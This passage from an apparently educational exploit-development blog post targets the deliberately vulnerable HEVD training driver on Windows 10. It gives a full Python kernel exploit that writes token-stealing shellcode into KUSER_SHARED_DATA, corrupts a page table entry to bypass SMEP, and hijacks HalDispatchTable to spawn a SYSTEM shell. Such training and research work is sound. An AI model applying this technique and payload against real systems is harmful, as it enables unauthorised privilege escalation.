What is even more interesting, is that `KUSER_SHARED_DATA+0x800` seems to just be a code cave of non-executable kernel mode memory which is writeable!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE-17.png" alt="">

How Do We Leverage This?
---

Our arbitrary write primitive only allows us to write one QWORD of data at a time (8 bytes). My thought process here is to:

1. Break up the 67 byte shellcode into 8 byte pieces and compensate any odd numbering with NULL bytes.
2. Write each line of shellcode to `KUSER_SHARED_DATA+0x800`, `KUSER_SHARED_DATA+0x808`,`KUSER_SHARED_DATA+0x810`, etc.
3. Use the same read primitive to bypass page table randomization and obtain PTE control bits of `KUSER_SHARED_DATA+0x800`.
4. Make `KUSER_SHARED_DATA+0x800` executable by overwriting the PTE.
5. `NT AUTHORITY\SYSTEM`

Before we begin, the steps about obtaining the contents of `nt!MiGetPteAddress+0x13` and extracting the PTE control bits will be left out in this portion of the blog, as they have already been explained in the beginning of this post!

Moving on, let's start with each line of shellcode.

For each line written the data type chosen was that of a [c_ulonglong()](https://docs.python.org/2/library/ctypes.html#ctypes.c_ulonglong) - as it was easy to store into a `c_void_p`.

The first line of shellcode had an associated structure as shown below.

```python
class WriteWhatWhere_Shellcode_1(Structure):
    _fields_ = [
        ("What_Shellcode_1", c_void_p),
        ("Where_Shellcode_1", c_void_p)
    ]
```

Shellcode is declared as a `c_ulonglong()`.

```python
# Using just long long integer, because only writing opcodes.
first_shellcode = c_ulonglong(0x00018825048B4865)
```

The shellcode is then written to `KUSER_SHARED_DATA+0x800` through the previously created structure.

```python
www_shellcode_one = WriteWhatWhere_Shellcode_1()
www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
www_shellcode_one_pointer = pointer(www_shellcode_one)
```

This same process was repeated 9 times, until all of the shellcode was written.

As you can see in the image below, the shellcode was successfully written to `KUSER_SHARED_DATA+0x800` due to the writeable PTE control bit of this structure.

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_19.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_18.png" alt="">

Executable, Please!
---

Using the same arbitrary read primitives as earlier, we can extract the PTE control bits of `KUSER_SHARED_DATA+0x800`'s memory page. This time, however, instead of subtracting 4 - we are going to use bitwise AND per Morten's research.

```python
# Setting KUSER_SHARED_DATA + 0x800 to executable
pte_control_bits_execute= pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF
```

We can see that dynamically, we can set `KUSER_SHARED_DATA+0x800` to executable memory, giving us a nice big executable kernel memory region!

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_20.png" alt="">

All that is left to do now, is overwrite the `nt!HalDispatchTable+0x8` with the address of `KUSER_SHARED_DATA+0x800` and `nt!KeQueryIntervalProfile()` will take care of the rest!

This exploit can also be found on [my GitHub](https://github.com/connormcgarr/AWE-OSEE-Prep/blob/master/Kernel/Arbitrary%20Memory%20Overwrites/x64_HEVD_Windows_10_SMEP_Bypass_KUSER_SHARED_DATA_Arbitrary_Overwrite.py), but here it is if you do not feel like heading over there:

```python
# HackSysExtreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite/SMEP Enabled)
# KUSER_SHARED_DATA + 0x800 overwrite
# Windows 10 RS1
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Defining KUSER_SHARED_DATA
KUSER_SHARED_DATA = 0xFFFFF78000000000

# First structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

# Second structure, first 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_1(Structure):
    _fields_ = [
        ("What_Shellcode_1", c_void_p),
        ("Where_Shellcode_1", c_void_p)
    ]

# Third structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_2(Structure):
    _fields_ = [
        ("What_Shellcode_2", c_void_p),
        ("Where_Shellcode_2", c_void_p)
    ]

# Fourth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_3(Structure):
    _fields_ = [
        ("What_Shellcode_3", c_void_p),
        ("Where_Shellcode_3", c_void_p)
    ]

# Fifth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_4(Structure):
    _fields_ = [
        ("What_Shellcode_4", c_void_p),
        ("Where_Shellcode_4", c_void_p)
    ]

# Sixth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_5(Structure):
    _fields_ = [
        ("What_Shellcode_5", c_void_p),
        ("Where_Shellcode_5", c_void_p)
    ]

# Seventh structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_6(Structure):
    _fields_ = [
        ("What_Shellcode_6", c_void_p),
        ("Where_Shellcode_6", c_void_p)
    ]

# Eighth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_7(Structure):
    _fields_ = [
        ("What_Shellcode_7", c_void_p),
        ("Where_Shellcode_7", c_void_p)
    ]

# Ninth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_8(Structure):
    _fields_ = [
        ("What_Shellcode_8", c_void_p),
        ("Where_Shellcode_8", c_void_p)
    ]

# Tenth structure, last 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_9(Structure):
    _fields_ = [
        ("What_Shellcode_9", c_void_p),
        ("Where_Shellcode_9", c_void_p)
    ]


# Eleventh structure, for obtaining the control bits for the PTE
class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]

# Twelfth structure, to overwrite executable bit of KUSER_SHARED_DATA+0x800's PTE
class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]

# Thirteenth structure, to overwrite HalDispatchTable + 0x8 with KUSER_SHARED_DATA + 0x800
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

"""
Token stealing payload

\x65\x48\x8B\x04\x25\x88\x01\x00\x00              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
\x48\x8B\x80\xB8\x00\x00\x00                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
\x48\x89\xC3                                      # mov rbx,rax         ; Copy current process to rbx
\x48\x8B\x9B\xF0\x02\x00\x00                      # mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
\x48\x81\xEB\xF0\x02\x00\x00                      # sub rbx,0x2f0       ; Go back to current process
\x48\x8B\x8B\xE8\x02\x00\x00                      # mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
\x48\x83\xF9\x04                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
\x75\xE5                                          # jnz 0x13            ; Loop until SYSTEM PID is found
\x48\x8B\x8B\x58\x03\x00\x00                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
\x80\xE1\xF0                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
\x48\x89\x88\x58\x03\x00\x00                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
\x48\x31\xC0                                      # xor rax,rax         ; set NTSTATUS SUCCESS
\xC3                                              # ret                 ; Done!
)
"""

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

# Print update for ntoskrnl.exe base address
print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

# Phase 1: Grab the base of the PTEs via nt!MiGetPteAddress

# Retrieving nt!MiGetPteAddress (Windows 10 RS1 offset)
nt_mi_get_pte_address = kernel_address + 0x1b5f4

# Print update for nt!MiGetPteAddress address 
print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13

# Print update for nt!MiGetPteAddress+0x13 address
print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))

# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()

# Write-what-where structure #1
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

# Getting handle to driver to return to DeviceIoControl() function
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_pointer,                       # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

# Print update for PTE base
print "[+] Leaked base of PTEs!"
print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))

# Phase 2: Calculate KUSER_SHARED_DATA's PTE address

# Calculating the PTE for KUSER_SHARED_DATA + 0x800
kuser_shared_data_800_pte_address = KUSER_SHARED_DATA + 0x800 >> 9
kuser_shared_data_800_pte_address &= 0x7ffffffff8
kuser_shared_data_800_pte_address += base_of_ptes

# Print update for KUSER_SHARED_DATA + 0x800 PTE
print "[+] PTE for KUSER_SHARED_DATA + 0x800 is located at {0}".format(hex(kuser_shared_data_800_pte_address))

# Phase 3: Write shellcode to KUSER_SHARED_DATA + 0x800

# First 8 bytes

# Using just long long integer, because only writing opcodes.
first_shellcode = c_ulonglong(0x00018825048B4865)

# Write-what-where structure #2
www_shellcode_one = WriteWhatWhere_Shellcode_1()
www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
www_shellcode_one_pointer = pointer(www_shellcode_one)

# Print update for shellcode
print "[+] Writing first 8 bytes of shellcode to KUSER_SHARED_DATA + 0x800..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_one_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
second_shellcode = c_ulonglong(0x000000B8808B4800)

# Write-what-where structure #3
www_shellcode_two = WriteWhatWhere_Shellcode_2()
www_shellcode_two.What_Shellcode_2 = addressof(second_shellcode)
www_shellcode_two.Where_Shellcode_2 = KUSER_SHARED_DATA + 0x808
www_shellcode_two_pointer = pointer(www_shellcode_two)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x808..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_two_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
third_shellcode = c_ulonglong(0x02F09B8B48C38948)

# Write-what-where structure #4
www_shellcode_three = WriteWhatWhere_Shellcode_3()
www_shellcode_three.What_Shellcode_3 = addressof(third_shellcode)
www_shellcode_three.Where_Shellcode_3 = KUSER_SHARED_DATA + 0x810
www_shellcode_three_pointer = pointer(www_shellcode_three)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x810..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_three_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
fourth_shellcode = c_ulonglong(0x0002F0EB81480000)

# Write-what-where structure #5
www_shellcode_four = WriteWhatWhere_Shellcode_4()
www_shellcode_four.What_Shellcode_4 = addressof(fourth_shellcode)
www_shellcode_four.Where_Shellcode_4 = KUSER_SHARED_DATA + 0x818
www_shellcode_four_pointer = pointer(www_shellcode_four)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x818..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_four_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
fifth_shellcode = c_ulonglong(0x000002E88B8B4800)

# Write-what-where structure #6
www_shellcode_five = WriteWhatWhere_Shellcode_5()
www_shellcode_five.What_Shellcode_5 = addressof(fifth_shellcode)
www_shellcode_five.Where_Shellcode_5 = KUSER_SHARED_DATA + 0x820
www_shellcode_five_pointer = pointer(www_shellcode_five)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x820..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_five_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
sixth_shellcode = c_ulonglong(0x8B48E57504F98348)

# Write-what-where structure #7
www_shellcode_six = WriteWhatWhere_Shellcode_6()
www_shellcode_six.What_Shellcode_6 = addressof(sixth_shellcode)
www_shellcode_six.Where_Shellcode_6 = KUSER_SHARED_DATA + 0x828
www_shellcode_six_pointer = pointer(www_shellcode_six)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x828..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_six_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
seventh_shellcode = c_ulonglong(0xF0E180000003588B)

# Write-what-where structure #8
www_shellcode_seven = WriteWhatWhere_Shellcode_7()
www_shellcode_seven.What_Shellcode_7 = addressof(seventh_shellcode)
www_shellcode_seven.Where_Shellcode_7 = KUSER_SHARED_DATA + 0x830
www_shellcode_seven_pointer = pointer(www_shellcode_seven)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x830..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_seven_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
eighth_shellcode = c_ulonglong(0x4800000358888948)

# Write-what-where structure #9
www_shellcode_eight = WriteWhatWhere_Shellcode_8()
www_shellcode_eight.What_Shellcode_8 = addressof(eighth_shellcode)
www_shellcode_eight.Where_Shellcode_8 = KUSER_SHARED_DATA + 0x838
www_shellcode_eight_pointer = pointer(www_shellcode_eight)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x838..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_eight_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Last 8 bytes
ninth_shellcode = c_ulonglong(0x0000000000C3C031)

# Write-what-where structure #10
www_shellcode_nine = WriteWhatWhere_Shellcode_9()
www_shellcode_nine.What_Shellcode_9 = addressof(ninth_shellcode)
www_shellcode_nine.Where_Shellcode_9 = KUSER_SHARED_DATA + 0x840
www_shellcode_nine_pointer = pointer(www_shellcode_nine)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x840..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_nine_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Phase 3: Extract KUSER_SHARED_DATA + 0x800's PTE control bits

# Declaring C void pointer to stores PTE control bits
pte_bits_pointer = c_void_p()

# Write-what-where structure #11
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = kuser_shared_data_800_pte_address
www_pte_bits.Where_PTE_Control_Bits = addressof(pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
pte_control_bits_no_execute = struct.unpack('<Q', pte_bits_pointer)[0]

# Print update for PTE control bits
print "[+] PTE control bits for KUSER_SHARED_DATA + 0x800: {:016x}".format(pte_control_bits_no_execute)

# Phase 4: Overwrite current PTE U/S bit for shellcode page with an S (supervisor/kernel)

# Setting KUSER_SHARED_DATA + 0x800 to executable
pte_control_bits_execute= pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF

# Need to store the PTE control bits as a pointer
# Using addressof(pte_overwrite_pointer) in Write-what-where structure #4 since a pointer to the PTE control bits are needed
pte_overwrite_pointer = c_void_p(pte_control_bits_execute)

# Write-what-where structure #12
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = kuser_shared_data_800_pte_address
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

# Print update for PTE overwrite
print "[+] Overwriting KUSER_SHARED_DATA + 0x800's PTE..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Print update for PTE overwrite round 2
print "[+] KUSER_SHARED_DATA + 0x800 is now executable! See you later, SMEP!"

# Phase 5: Shellcode

# nt!HalDispatchTable address (Windows 10 RS1 offset)
haldispatchtable_base_address = kernel_address + 0x2f43b0

# nt!HalDispatchTable + 0x8 address
haldispatchtable = haldispatchtable_base_address + 0x8

# Print update for nt!HalDispatchTable + 0x8
print "[+] nt!HalDispatchTable + 0x8 is located at: {0}".format(hex(haldispatchtable))

# Declaring KUSER_SHARED_DATA + 0x800 address again as a c_ulonglong to satisy c_void_p type from strucutre.
KUSER_SHARED_DATA_LONGLONG = c_ulonglong(0xFFFFF78000000800)

# Write-what-where structure #13
www = WriteWhatWhere()
www.What = addressof(KUSER_SHARED_DATA_LONGLONG)
www.Where = haldispatchtable
www_pointer = pointer(www)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
print "[+] Interacting with the driver..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pointer,                        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Actually calling NtQueryIntervalProfile function, which will call HalDispatchTable + 0x8, where the shellcode will be waiting.
ntdll.NtQueryIntervalProfile(
    0x1234,
    byref(c_ulonglong())
)

# Print update for shell
print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!"
os.system("cmd.exe /K cd C:\\")
```

NT AUTHORITY\SYSTEM x 2!
---

<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_2.gif" alt="">

Final Thoughts
---

I really enjoyed this method of SMEP bypass! I also loved circumventing SMEP all together and bypassing NonPagedPoolNx via  `KUSER_SHARED_DATA+0x800` without the need for user mode memory!

I am always looking for new challenges and decided this would be a fun one!

If you would like to take a look at how SMEP can be bypassed via `U/S` bit corruption in C, [here](https://github.com/connormcgarr/Kernel-Exploits/blob/master/HEVD/Write-What-Where/Windows10_WriteWhatWhere.c) is this same exploit written in C (note - some offsets may be different).

As always, feel free to reach out to me with any questions, comments, or corrections! Until then!

Peace, love, and positivity! :-)
